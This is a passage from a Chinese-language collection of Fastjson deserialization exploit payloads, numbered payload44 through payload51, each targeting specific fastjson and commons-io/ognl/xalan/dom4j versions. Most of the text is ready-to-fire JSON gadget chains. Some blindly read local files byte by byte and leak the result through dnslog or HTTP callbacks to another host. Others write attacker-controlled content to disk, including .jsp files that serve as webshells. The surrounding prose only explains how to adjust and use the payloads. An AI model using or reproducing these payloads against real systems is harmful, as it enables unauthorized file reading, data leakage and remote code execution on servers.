:&quot;UTF-8&quot;,&quot;bytes&quot;:[1]}]},&quot;zzz&quot;:{&quot;$ref&quot;:&quot;$.xxx.BOM[0]&quot;}} 极端场景：有一个接口，用fastjson解析了json，但不会反馈任何能够作为状态判断的标识，连异常报错的信息都没有。 那么此时该payload就可以派上用场了，如果以上poc收到了dnslog响应，那么说明字节码比对失败，也就是第一个字节的int值不等于我们填入的那个数字（比如这里的98，此时我们就得更改数字继续测试）；如果没收到，说明比对成功，继续测试即可。 4.2.3 blackhat2021-getBom() tyskill师傅改版（几乎适配所有场景）payload44： 1{&quot;abc&quot;:{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,&quot;delegate&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;jdk.nashorn.api.scripting.URLReader&quot;,&quot;url&quot;:&quot;file:///C:/Users/whoami/Desktop/testtest.txt&quot;},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;boms&quot;:[{&quot;@type&quot;:&quot;org.apache.commons.io.ByteOrderMark&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bytes&quot;:[98,]}]},&quot;address&quot;:{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,&quot;delegate&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;jdk.nashorn.api.scripting.URLReader&quot;,&quot;url&quot;:&quot;http://192.168.161.4:8085/&quot;},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;boms&quot;:[{&quot;$ref&quot;:&quot;$.abc.BOM[0]&quot;}]},&quot;xxx&quot;:{&quot;$ref&quot;:&quot;$.address.BOM[0]&quot;}} 该payload是浅蓝师傅的payload的改版，主要区别在于这个是dnslog或者http服务有响应说明字节码比对成功，和浅蓝的那个是反着来的。 五、文件写入5.1 commons-io 2.x（1.2.37&lt;=version&lt;=1.2.68）5.1.1 最初公开的payload（只能在centos下利用）payload45： 12345678910111213141516171819{ &quot;x&quot;:{ &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;sun.rmi.server.MarshalOutputStream&quot;, &quot;out&quot;:{ &quot;@type&quot;:&quot;java.util.zip.InflaterOutputStream&quot;, &quot;out&quot;:{ &quot;@type&quot;:&quot;java.io.FileOutputStream&quot;, &quot;file&quot;:&quot;C:/Users/whoami/Desktop/testtesttest.txt&quot;, &quot;append&quot;:false }, &quot;infl&quot;:{ &quot;input&quot;:&quot;SGVsbG8sIFcwMWZoNGNrZXIh&quot; }, &quot;bufLen&quot;:1048576 }, &quot;protocolVersion&quot;:1 }} Windows下利用会报错，只能在目标是centos的情况下使用： 至于为什么会这样，请参考以下文章，写的很清楚很明白，在此不再赘述： https://www.cnblogs.com/zpchcbd/p/14969606.html 5.1.2 commons-io 2.0~2.6版本payload46： 需要注意，需要修改下面的W01fh4ckeraaaaaa...为自己想要写入的内容，需要注意的是，长度要大于8192，实际写入前8192个字符！具体原因请参考下面的文章，文章里面写的非常清楚： https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg 1{&quot;x&quot;:{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&quot;input&quot;:{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.CharSequenceReader&quot;,&quot;charSequence&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;&quot;W01fh4ckeraaaaaa...&quot;},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;branch&quot;:{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.output.WriterOutputStream&quot;,&quot;writer&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;,&quot;file&quot;:&quot;W01fh4cker.txt&quot;,&quot;encoding&quot;:&quot;UTF-8&quot;,&quot;append&quot;:false},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024,&quot;writeImmediately&quot;:true},&quot;trigger&quot;:{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;is&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:{&quot;$ref&quot;:&quot;$.input&quot;},&quot;branch&quot;:{&quot;$ref&quot;:&quot;$.branch&quot;},&quot;closeBranch&quot;:true},&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;},&quot;trigger2&quot;:{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;is&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:{&quot;$ref&quot;:&quot;$.input&quot;},&quot;branch&quot;:{&quot;$ref&quot;:&quot;$.branch&quot;},&quot;closeBranch&quot;:true},&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;},&quot;trigger3&quot;:{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;is&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:{&quot;$ref&quot;:&quot;$.input&quot;},&quot;branch&quot;:{&quot;$ref&quot;:&quot;$.branch&quot;},&quot;closeBranch&quot;:true},&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;}}} 5.1.3 commons-io 2.7~2.8.0版本和上面大差不差，同样需要自行修改写入内容。 payload47： 1{&quot;x&quot;:{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&quot;input&quot;:{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.CharSequenceReader&quot;,&quot;charSequence&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;&quot;W01fh4ckeraaaaaa...&quot;,&quot;start&quot;:0,&quot;end&quot;:2147483647},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;branch&quot;:{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.output.WriterOutputStream&quot;,&quot;writer&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;,&quot;file&quot;:&quot;2.txt&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;append&quot;:false},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024,&quot;writeImmediately&quot;:true},&quot;trigger&quot;:{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;inputStream&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:{&quot;$ref&quot;:&quot;$.input&quot;},&quot;branch&quot;:{&quot;$ref&quot;:&quot;$.branch&quot;},&quot;closeBranch&quot;:true},&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;},&quot;trigger2&quot;:{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;inputStream&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:{&quot;$ref&quot;:&quot;$.input&quot;},&quot;branch&quot;:{&quot;$ref&quot;:&quot;$.branch&quot;},&quot;closeBranch&quot;:true},&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;},&quot;trigger3&quot;:{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;inputStream&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:{&quot;$ref&quot;:&quot;$.input&quot;},&quot;branch&quot;:{&quot;$ref&quot;:&quot;$.branch&quot;},&quot;closeBranch&quot;:true},&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;}}} 5.2 ognl+commons-io 2.x（1.2.73&lt;=version&lt;=1.2.80）5.2.1 ognl+commons-io 2.0~2.6版本payload48： 同样是省略了一堆a，需要自行修改补充。 1{&quot;su14&quot;:{&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;ognl.OgnlException&quot;},&quot;su15&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,{&quot;@type&quot;:&quot;java.lang.String&quot;&quot;@type&quot;:&quot;ognl.OgnlException&quot;,&quot;_evaluation&quot;:&quot;&quot;}},&quot;su16&quot;:{&quot;@type&quot;:&quot;ognl.Evaluation&quot;,&quot;node&quot;:{&quot;@type&quot;:&quot;ognl.ASTMethod&quot;,&quot;p&quot;:{&quot;@type&quot;:&quot;ognl.OgnlParser&quot;,&quot;stream&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,&quot;delegate&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;is&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.CharSequenceReader&quot;,&quot;charSequence&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;&quot;W01fh4ckeraaaaaa...&quot;},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;branch&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.output.WriterOutputStream&quot;,&quot;writer&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;,&quot;file&quot;:&quot;W01fh4cker.jsp&quot;,&quot;encoding&quot;:&quot;UTF-8&quot;,&quot;append&quot;:false},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024,&quot;writeImmediately&quot;:true},&quot;closeBranch&quot;:true},&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;boms&quot;:[{&quot;@type&quot;:&quot;org.apache.commons.io.ByteOrderMark&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bytes&quot;:[36,82]}]}}}},&quot;su17&quot;:{&quot;@type&quot;:&quot;ognl.Evaluation&quot;,&quot;node&quot;:{&quot;@type&quot;:&quot;ognl.ASTMethod&quot;,&quot;p&quot;:{&quot;@type&quot;:&quot;ognl.OgnlParser&quot;,&quot;stream&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,&quot;delegate&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;is&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:{&quot;$ref&quot;:&quot;$.su16.node.p.stream.delegate.reader.is.input&quot;},&quot;branch&quot;:{&quot;$ref&quot;:&quot;$.su16.node.p.stream.delegate.reader.is.branch&quot;},&quot;closeBranch&quot;:true},&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;boms&quot;:[{&quot;@type&quot;:&quot;org.apache.commons.io.ByteOrderMark&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bytes&quot;:[36,82]}]}}}},&quot;su18&quot;:{&quot;@type&quot;:&quot;ognl.Evaluation&quot;,&quot;node&quot;:{&quot;@type&quot;:&quot;ognl.ASTMethod&quot;,&quot;p&quot;:{&quot;@type&quot;:&quot;ognl.OgnlParser&quot;,&quot;stream&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,&quot;delegate&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;is&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:{&quot;$ref&quot;:&quot;$.su16.node.p.stream.delegate.reader.is.input&quot;},&quot;branch&quot;:{&quot;$ref&quot;:&quot;$.su16.node.p.stream.delegate.reader.is.branch&quot;},&quot;closeBranch&quot;:true},&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;boms&quot;:[{&quot;@type&quot;:&quot;org.apache.commons.io.ByteOrderMark&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bytes&quot;:[36,82]}]}}}},&quot;su19&quot;:{&quot;@type&quot;:&quot;ognl.Evaluation&quot;,&quot;node&quot;:{&quot;@type&quot;:&quot;ognl.ASTMethod&quot;,&quot;p&quot;:{&quot;@type&quot;:&quot;ognl.OgnlParser&quot;,&quot;stream&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,&quot;delegate&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;is&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:{&quot;$ref&quot;:&quot;$.su16.node.p.stream.delegate.reader.is.input&quot;},&quot;branch&quot;:{&quot;$ref&quot;:&quot;$.su16.node.p.stream.delegate.reader.is.branch&quot;},&quot;closeBranch&quot;:true},&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;boms&quot;:[{&quot;@type&quot;:&quot;org.apache.commons.io.ByteOrderMark&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bytes&quot;:[36,82]}]}}}},} 5.2.2 ognl+commons-io 2.7~2.8版本payload49： 1{&quot;su14&quot;:{&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;ognl.OgnlException&quot;},&quot;su15&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,{&quot;@type&quot;:&quot;java.lang.String&quot;&quot;@type&quot;:&quot;ognl.OgnlException&quot;,&quot;_evaluation&quot;:&quot;&quot;}},&quot;su16&quot;:{&quot;@type&quot;:&quot;ognl.Evaluation&quot;,&quot;node&quot;:{&quot;@type&quot;:&quot;ognl.ASTMethod&quot;,&quot;p&quot;:{&quot;@type&quot;:&quot;ognl.OgnlParser&quot;,&quot;stream&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,&quot;delegate&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;inputStream&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.CharSequenceReader&quot;,&quot;charSequence&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;&quot;W01fh4ckeraaaaaa...&quot;,&quot;start&quot;:0,&quot;end&quot;:2147483647},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;branch&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.output.WriterOutputStream&quot;,&quot;writer&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;,&quot;file&quot;:&quot;W01fh4cker666.jsp&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;append&quot;:false},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024,&quot;writeImmediately&quot;:true},&quot;closeBranch&quot;:true},&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;boms&quot;:[{&quot;@type&quot;:&quot;org.apache.commons.io.ByteOrderMark&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bytes&quot;:[36,82]}]}}}},&quot;su17&quot;:{&quot;@type&quot;:&quot;ognl.Evaluation&quot;,&quot;node&quot;:{&quot;@type&quot;:&quot;ognl.ASTMethod&quot;,&quot;p&quot;:{&quot;@type&quot;:&quot;ognl.OgnlParser&quot;,&quot;stream&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,&quot;delegate&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;inputStream&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:{&quot;$ref&quot;:&quot;$.su16.node.p.stream.delegate.reader.inputStream.input&quot;},&quot;branch&quot;:{&quot;$ref&quot;:&quot;$.su16.node.p.stream.delegate.reader.inputStream.branch&quot;},&quot;closeBranch&quot;:true},&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;boms&quot;:[{&quot;@type&quot;:&quot;org.apache.commons.io.ByteOrderMark&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bytes&quot;:[36,82]}]}}}},&quot;su18&quot;:{&quot;@type&quot;:&quot;ognl.Evaluation&quot;,&quot;node&quot;:{&quot;@type&quot;:&quot;ognl.ASTMethod&quot;,&quot;p&quot;:{&quot;@type&quot;:&quot;ognl.OgnlParser&quot;,&quot;stream&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,&quot;delegate&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;inputStream&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:{&quot;$ref&quot;:&quot;$.su16.node.p.stream.delegate.reader.inputStream.input&quot;},&quot;branch&quot;:{&quot;$ref&quot;:&quot;$.su16.node.p.stream.delegate.reader.inputStream.branch&quot;},&quot;closeBranch&quot;:true},&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;boms&quot;:[{&quot;@type&quot;:&quot;org.apache.commons.io.ByteOrderMark&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bytes&quot;:[36,82]}]}}}},&quot;su19&quot;:{&quot;@type&quot;:&quot;ognl.Evaluation&quot;,&quot;node&quot;:{&quot;@type&quot;:&quot;ognl.ASTMethod&quot;,&quot;p&quot;:{&quot;@type&quot;:&quot;ognl.OgnlParser&quot;,&quot;stream&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,&quot;delegate&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;inputStream&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:{&quot;$ref&quot;:&quot;$.su16.node.p.stream.delegate.reader.inputStream.input&quot;},&quot;branch&quot;:{&quot;$ref&quot;:&quot;$.su16.node.p.stream.delegate.reader.inputStream.branch&quot;},&quot;closeBranch&quot;:true},&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;boms&quot;:[{&quot;@type&quot;:&quot;org.apache.commons.io.ByteOrderMark&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bytes&quot;:[36,82]}]}}}}} 5.2.3 ognl+commons-io+aspectjtools+commons-codec组合利用链这条链主要是为了解决前面提到的的io链无法写入复杂文件结构的问题，文件依旧需要大于8kb才能写入。poc地址如下： https://github.com/safe6Sec/ShiroAndFastJson/blob/master/src/main/java/com/shiro/vuln/fastjson/Fastjson26_ognl_io_write_4.java 5.3 xalan+dom4j+commons-io（1.2.73&lt;=version&lt;=1.2.80）5.3.1 xalan+dom4j+commons-io（2.0~2.6版本）分四步打，自行修改写入内容。 payload50（组合拳）： 1{&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;org.apache.xml.dtm.DTMConfigurationException&quot;,&quot;locator&quot;:{}} 1{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;{&quot;@type&quot;:&quot;java.util.Locale&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,{&quot;@type&quot;:&quot;java.lang.String&quot;&quot;@type&quot;:&quot;org.apache.xml.dtm.DTMConfigurationException&quot;,&quot;locator&quot;:{}}}} 1{&quot;su14&quot;:{&quot;@type&quot;:&quot;javax.xml.transform.SourceLocator&quot;,&quot;@type&quot;:&quot;org.apache.xpath.objects.XNodeSetForDOM&quot;,&quot;nodeIter&quot;:{&quot;@type&quot;:&quot;org.apache.xpath.NodeSet&quot;},&quot;xctxt&quot;:{&quot;@type&quot;:&quot;org.apache.xpath.XPathContext&quot;,&quot;primaryReader&quot;:{&quot;@type&quot;:&quot;org.dom4j.io.XMLWriter&quot;,&quot;entityResolver&quot;:{&quot;@type&quot;:&quot;org.dom4j.io.SAXContentHandler&quot;,&quot;inputSource&quot;:{&quot;byteStream&quot;:{&quot;@type&quot;:&quot;java.io.InputStream&quot;}}}}}}} 1{&quot;su16&quot;:{&quot;@type&quot;:&quot;java.io.InputStream&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,&quot;delegate&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;is&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.CharSequenceReader&quot;,&quot;charSequence&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;&quot;W01fh4ckeraaaaaa...&quot;},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;branch&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.output.WriterOutputStream&quot;,&quot;writer&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;,&quot;file&quot;:&quot;W01fh4cker888.jsp&quot;,&quot;encoding&quot;:&quot;UTF-8&quot;,&quot;append&quot;:false},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024,&quot;writeImmediately&quot;:true},&quot;closeBranch&quot;:true},&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;boms&quot;:[{&quot;@type&quot;:&quot;org.apache.commons.io.ByteOrderMark&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bytes&quot;:[36,82]}]},&quot;su17&quot;:{&quot;@type&quot;:&quot;java.io.InputStream&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,&quot;delegate&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;is&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:{&quot;$ref&quot;:&quot;$.su16.delegate.reader.is.input&quot;},&quot;branch&quot;:{&quot;$ref&quot;:&quot;$.su16.delegate.reader.is.branch&quot;},&quot;closeBranch&quot;:true},&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;boms&quot;:[{&quot;@type&quot;:&quot;org.apache.commons.io.ByteOrderMark&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bytes&quot;:[36,82]}]},&quot;su18&quot;:{&quot;@type&quot;:&quot;java.io.InputStream&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,&quot;delegate&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;is&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:{&quot;$ref&quot;:&quot;$.su16.delegate.reader.is.input&quot;},&quot;branch&quot;:{&quot;$ref&quot;:&quot;$.su16.delegate.reader.is.branch&quot;},&quot;closeBranch&quot;:true},&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;boms&quot;:[{&quot;@type&quot;:&quot;org.apache.commons.io.ByteOrderMark&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bytes&quot;:[36,82]}]},&quot;su19&quot;:{&quot;@type&quot;:&quot;java.io.InputStream&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,&quot;delegate&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;is&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:{&quot;$ref&quot;:&quot;$.su16.delegate.reader.is.input&quot;},&quot;branch&quot;:{&quot;$ref&quot;:&quot;$.su16.delegate.reader.is.branch&quot;},&quot;closeBranch&quot;:true},&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;boms&quot;:[{&quot;@type&quot;:&quot;org.apache.commons.io.ByteOrderMark&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bytes&quot;:[36,82]}]}} 5.3.2 xalan+dom4j+commons-io（2.7~2.8版本）还是分四步打。 payload51（组合拳）： 